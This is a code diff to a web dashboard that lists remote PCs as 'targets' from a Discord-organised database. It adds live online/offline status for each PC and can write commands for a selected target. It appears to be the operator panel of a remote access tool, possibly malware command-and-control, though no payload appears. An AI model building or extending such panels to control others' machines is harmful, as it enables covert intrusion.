@@ -416,7 +416,8 @@
                 if (foundID) {
                     window.currentTargetID = foundID;
                     dashboard.style.display = "grid"; 
-                    status.innerHTML = `<span style="color:var(--success)">● Connected:</span> ${category}`;
+                    
+                    updatePanelStatus();
                 } else {
                     dashboard.style.display = "none";
                     status.innerHTML = `<span style="color:var(--danger)">● Error:</span> Remote access channel missing`;
@@ -425,6 +426,41 @@
         };
 
         const logsRef = query(ref(db, 'logs'), limitToLast(15));
+
+        let onlineStatus = {};
+
+        onValue(ref(db, 'status'), (snap) => {
+            if(snap.exists()) {
+                onlineStatus = snap.val();
+            }
+        });
+
+        get(child(dbRef, `discord_structure`)).then((snapshot) => {
+            const select = document.getElementById('categorySelect');
+            if (snapshot.exists()) {
+                const data = snapshot.val();
+                const structure = data.structure || data;
+                
+                select.innerHTML = `<option value="">-- Select Target --</option>`;
+                
+                for (const [serverName, categories] of Object.entries(structure)) {
+                    if (serverName === "last_updated") continue;
+                    
+                    const group = document.createElement('optgroup');
+                    group.label = serverName;
+                    
+                    for (const catName of Object.keys(categories)) {
+                        const option = document.createElement('option');
+                        option.value = JSON.stringify({ server: serverName, category: catName });
+                        option.innerText = `🖥️ ${catName}`; 
+                        group.appendChild(option);
+                    }
+                    select.appendChild(group);
+                }
+            } else {
+                select.innerHTML = '<option>No PCs Found</option>';
+            }
+        });
         onValue(logsRef, (snap) => {
             const list = document.getElementById('logList');
             list.innerHTML = ""; 
@@ -439,6 +475,24 @@
         });
 
         // ACTIONS
+
+        function updatePanelStatus() {
+            if (!window.currentPCName || window.currentPCName === "Unknown") return;
+
+            const lastSeen = onlineStatus[window.currentPCName]?.last_seen || 0;
+            const isOnline = (Date.now() - lastSeen) < 20000; // 20s Timeout
+            
+            const status = document.getElementById('targetStatus');
+            
+            if (isOnline) {
+                status.innerHTML = `<span style="color:var(--success)">● ONLINE:</span> ${window.currentPCName} is active.`;
+            } else {
+                status.innerHTML = `<span style="color:var(--danger)">● OFFLINE:</span> ${window.currentPCName} is unreachable.`;
+            }
+        }
+
+        setInterval(updatePanelStatus, 1000);
+
         function writeDB(data) {
             if (!window.currentTargetID) return alert("Select a Target first!");
             data.target_id = window.currentTargetID;
